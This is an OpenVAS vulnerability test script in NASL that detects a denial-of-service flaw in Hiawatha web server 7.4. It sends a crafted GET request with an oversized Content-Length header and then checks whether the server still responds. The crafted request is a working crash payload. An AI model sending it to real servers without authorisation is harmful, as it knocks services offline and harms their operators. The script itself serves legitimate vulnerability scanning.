###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_hiawatha_web_srv_content_length_dos.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# Hiawatha WebServer 'Content-Length' Denial of Service Vulnerability
#
# Authors:
# Veerendra GG <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802007");
  script_version("$Revision: 11997 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-03-16 15:16:52 +0100 (Wed, 16 Mar 2011)");
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:C/A:C");
  script_name("Hiawatha WebServer 'Content-Length' Denial of Service Vulnerability");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/16939/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/99021/DCA-2011-0006.txt");
  script_xref(name:"URL", value:"http://www.hiawatha-webserver.org/weblog/16");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Hiawatha/banner");

  script_tag(name:"impact", value:"Successful exploitation could allow remote unauthenticated
  attackers to cause a denial of service or possibly execute arbitrary code.");
  script_tag(name:"affected", value:"Hiawatha Webserver Version 7.4, Other versions may also be
  affected.");
  script_tag(name:"insight", value:"The flaw is due to the way Hiawatha web server validates
  requests with a bigger 'Content-Length' causing application crash.");
  script_tag(name:"solution", value:"Vendor has released a workaround to fix the issue, please refer
  below link for details on workaround.");
  script_tag(name:"summary", value:"This host is running Hiawatha Web Server and is prone to denial
  of service vulnerability.");

  script_tag(name:"solution_type", value:"Workaround");
  script_tag(name:"qod_type", value:"remote_banner");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

banner = get_http_banner(port: port);
if(!banner || "Server: Hiawatha" >!< banner){
  exit(0);
}

host = http_host_name(port:port);

attackReq = string( 'GET / HTTP/1.1\r\n',
                    'Host: ' + host + '\r\n',
                    'Content-Length: 2147483599\r\n\r\n' );

## Send crafted Request
res = http_send_recv(port:port, data:attackReq);

## Send proper Get request and check the response to
req = http_get(item:"/", port:port);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:1);

## If response is null means Hiawatha Web Server is dead
if(!res){
  security_message(port:port);
  exit(0);
}

exit(99);
